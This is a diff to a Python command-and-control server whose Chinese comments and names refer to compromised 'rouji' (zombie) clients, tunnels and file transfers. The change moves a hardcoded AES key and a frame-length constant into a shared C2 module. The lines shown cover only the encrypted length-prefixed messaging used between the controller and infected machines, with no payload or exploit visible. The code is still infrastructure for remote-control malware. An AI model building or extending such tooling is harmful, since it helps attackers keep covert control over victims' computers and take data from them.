@@ -9,6 +9,7 @@ from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 import select
 import chardet  # 需要安装: pip install chardet
+from c2_common import C2_AES_KEY, C2_FRAME_HEADER_LEN
 
 ### 常量设置
 target = ""
@@ -25,9 +26,6 @@ Client_roujis = dict()
 Tunnels = dict()
 # 文件传输状态管理：{rouji_id: {"in_transfer": bool, "client_socket": socket, "file_handle": object, "file_size": int, "received_size": int, "save_path": str}}
 transfer_states = {}
-
-# C2 帧协议：AES 加密后的长度前缀固定为 44 字节（base64(IV 16 + 1 个 AES 块 16)）
-C2_FRAME_HEADER_LEN = 44
 
 def aes_encrypt(plaintext: bytes, key: bytes) -> str:
     iv = os.urandom(AES.block_size)
@@ -57,7 +55,7 @@ def send_result(client_socket, result_bytes):
     data_length = len(result_bytes)
 
     # 打包长度前缀（AES 加密后固定为 44 字节）
-    length_prefix = aes_encrypt(str(data_length).encode('utf-8'), b'0123456789abcdef')
+    length_prefix = aes_encrypt(str(data_length).encode('utf-8'), C2_AES_KEY)
 
     # 单帧 sendall + 每 socket 一把锁：避免两次 send 被拆开、多线程并发导致帧交错
     payload = result_bytes.encode('utf-8') if isinstance(result_bytes, str) else result_bytes
@@ -104,7 +102,7 @@ def recv_exactly(client_socket, n):
 
 def recv_result(client_socket):
     # 1. 读取 C2_FRAME_HEADER_LEN(44) 字节 AES 加密的长度前缀（循环累积防 TCP 拆包）
-    length_bytes = aes_decrypt(recv_exactly(client_socket, C2_FRAME_HEADER_LEN), b'0123456789abcdef')
+    length_bytes = aes_decrypt(recv_exactly(client_socket, C2_FRAME_HEADER_LEN), C2_AES_KEY)
     # 2. 解包获取实际数据长度
     data_length = int(length_bytes.decode('utf-8'))
     # 3. 根据长度读取实际数据（data_length 为 0 时返回空字节）
